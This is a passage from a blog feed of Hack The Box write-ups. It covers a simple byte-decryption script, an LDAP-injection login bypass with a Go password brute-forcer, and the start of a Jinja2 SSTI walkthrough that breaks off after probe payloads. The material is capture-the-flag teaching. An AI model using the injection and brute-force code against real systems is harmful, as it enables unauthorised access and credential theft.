+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./msg.enc&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;enc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fromhex(f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read())
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; enc:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;127&lt;/span&gt;):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; c:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(chr(i))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(msg))
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Since valid characters for the flag will start form ascii values 33 - 127. We are iterating over those values only. Our code has runtime of O(n^2) and could probably be optimised using a hash map but since the the encrypted message is not long, it does not really matter in our case.&lt;/p&gt;
+&lt;p&gt;Output from our program.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt; python3 decryption.py
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Th3 nucl34r w1ll 4rr1v3 0n fr1d4y.HTB&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;**************************&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;That&amp;rsquo;s it.&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>[HTB] Phonebook writeup</title>
+      <link>/posts/phonebook/</link>
+      <pubDate>Mon, 13 Feb 2023 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/phonebook/</guid>
+      <description>This is my writeup for Hackthebox phonebook Web Challenge. Intially finding a way to exploit the website was quite hard, but once we find the vulnerability, the challenge is pretty straight forward and requires just basic bruteforcing. It also tests our scripting skill and all in all, the challenge is a satisfying one.
+Initial Analysis Visiting the ip address we are greeted with a login page and some information about a workstation user called Reese.</description>
+      <content>&lt;p&gt;This is my writeup for Hackthebox &lt;a href=&#34;https://app.hackthebox.com/challenges/phonebook&#34;&gt;phonebook&lt;/a&gt; Web Challenge. Intially finding a way to exploit the website was quite hard, but once we find the vulnerability, the challenge is pretty straight forward and requires just basic bruteforcing. It also tests our scripting skill and all in all, the challenge is a satisfying one.&lt;/p&gt;
+&lt;h1 id=&#34;initial-analysis&#34;&gt;Initial Analysis&lt;/h1&gt;
+&lt;p&gt;Visiting the ip address we are greeted with a login page and some information about a workstation user called Reese.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/phonebook/phonebook1.png&#34; alt=&#34;phonebook/login&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;img: phonebook/login&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Since I am greeted with a login page, I tried my luck with sqli for quite a while but it yielded no results.
+All my inputs were greeted with &lt;code&gt;Authentication failed&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/phonebook/phonebook2.png&#34; alt=&#34;phonebook/login&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;img: phonebook/login&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;After going through the forums and looking for some hints, I got hints of using wildcards in the input. So I tried &lt;code&gt;*&lt;/code&gt; in both the login fields.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Just like that, I was in.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The challenge wasn&amp;rsquo;t over and the authenticated page contained just a search page field. I did the same thing as before and tried inputting different combinations of characters and injections in the search field. Inputting alphanumeric characters yielded names, emails and phonenumbers of people but I still couldn&amp;rsquo;t find the flag for the challenge.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/phonebook/phonebook3.png&#34; alt=&#34;phonebook/login&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;img: phonebook/search=reese&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Since the login page had greeted us with workstation user &lt;code&gt;reese&lt;/code&gt;, it must be a hint to the flag.
+So I tried reese as the username and &lt;code&gt;*&lt;/code&gt; for the password and I was able to log in.&lt;/p&gt;
+&lt;p&gt;I got another hint that the challenge is based on &lt;a href=&#34;https://www.synopsys.com/glossary/what-is-ldap-injection.html&#34;&gt;LDAP injection&lt;/a&gt;. So I shifted my focus on getting the password for the username reese since it was quite possibly the flag for the challenge.&lt;/p&gt;
+&lt;p&gt;So here is the code I wrote for bruteforcing the password using &lt;code&gt;*&lt;/code&gt; characters at the end and trying different permutations of alphanumeric and symbols.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;package&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; (
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fmt&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;net/http&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;net/url&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;strings&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; (
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;URL&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://144.126.236.52:31199/login&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;checkLogin&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;formData&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Values&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;response&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;PostForm&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;URL&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;formData&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;defer&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;response&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Body&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Close&lt;/span&gt;()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;redir&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;response&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Request&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;URL&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;String&lt;/span&gt;()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; !&lt;span style=&#34;color:#a6e22e&#34;&gt;strings&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Contains&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;redir&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Authentication&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890@_$%!&amp;amp;{}&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;counter&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;counter&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; len(&lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;password&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Sprintf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s%c*&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;counter&lt;/span&gt;])
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;formData&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Values&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;: {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;reese&amp;#34;&lt;/span&gt;},
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;: {&lt;span style=&#34;color:#a6e22e&#34;&gt;password&lt;/span&gt;},
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;checkLogin&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;formData&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Sprintf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s%c&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;counter&lt;/span&gt;])
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;counter&lt;/span&gt; = &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		} &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;counter&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And here is output of the code. I had tried to run the bruteforcing concurrently but it had very little impact on the performance since, the machine did not accept many simultaneous request.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt; go run main.go
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;H
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;HT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;HTB&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;*
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;HTB&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;******
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;HTB&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;**********&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;That&amp;rsquo;s it&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>[HTB] Templated Writeup</title>
+      <link>/posts/templated/</link>
+      <pubDate>Sat, 14 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/templated/</guid>
+      <description>This is my writeup for Hackthebox Templated Web Challenge. The challenge is fairly straight forward and is an easier challenge.
+Initial Analysis Visiting the ip address provided, we are greeted with site still under construction page with powered by Flask/Jinja2 text at the bottom.
+img: Site still under construction.
+Upon investigation we discover that Flask is a python web framework while Jinja2 is the templating engine utilised. Since the name of the challenge also includes templated we can be fairly certain that it has to do something with Server Side Template Injection.</description>
+      <content>&lt;p&gt;This is my writeup for Hackthebox &lt;a href=&#34;https://app.hackthebox.com/challenges/templated&#34;&gt;Templated&lt;/a&gt; Web Challenge. The challenge is fairly straight forward and is an easier challenge.&lt;/p&gt;
+&lt;h2 id=&#34;initial-analysis&#34;&gt;Initial Analysis&lt;/h2&gt;
+&lt;p&gt;Visiting the ip address provided, we are greeted with &lt;code&gt;site still under construction&lt;/code&gt; page with powered by &lt;code&gt;Flask/Jinja2&lt;/code&gt; text at the bottom.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/templated/templated1.png&#34; alt=&#34;site still under&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;img: Site still under construction.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Upon investigation we discover that &lt;code&gt;Flask&lt;/code&gt; is a python web framework while &lt;code&gt;Jinja2&lt;/code&gt; is the templating engine utilised. Since the name of the challenge also includes &lt;code&gt;template&lt;/code&gt;d we can be fairly certain that it has to do something with &lt;code&gt;Server Side Template Injection&lt;/code&gt;.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side. &lt;a href=&#34;https://portswigger.net/web-security/server-side-template-injection#:~:text=What%20is%20server%2Dside%20template,fixed%20templates%20with%20volatile%20data.&#34;&gt;PortSwigger.net&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;SSTI basically allows us to exploit the templating engine to execute code and other payloads.&lt;/p&gt;
+&lt;h2 id=&#34;testing&#34;&gt;Testing&lt;/h2&gt;
+&lt;p&gt;Let us test the url by injecting a plain text in the address bar of the browser.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/templated/templated2.png&#34; alt=&#34;text&#34;&gt;&lt;/p&gt;
+&lt;p&gt;img: Text displayed on the screen.&lt;/p&gt;
+&lt;p&gt;Now injecting a SSTI payload in the address.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{{&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;}}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;/images/templated/templated3.png&#34; alt=&#34;text&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;img: Value of 2 displayed.&lt;/em&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hello&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;upper()}}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let us try another python string method.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/templated/templated4.png&#34; alt=&#34;text&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;img: String hello is capitalised.&lt;/em&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hello&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;upper()}}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Our goal is to exploit the template engine so that we can import the &lt;code&gt;os&lt;/code&gt; library and make system calls on the servers.
+Here is a really good &lt;a href=&#34;https://secure-cookie.io/attacks/ssti/&#34;&gt;resource&lt;/a&gt; on how to achieve this by leveraging python classes and modules.&lt;/p&gt;
+&lt;p&gt;Using this code below, we look at the base class of the string and then list the subclasses derived from the base class.&lt;/p&gt;
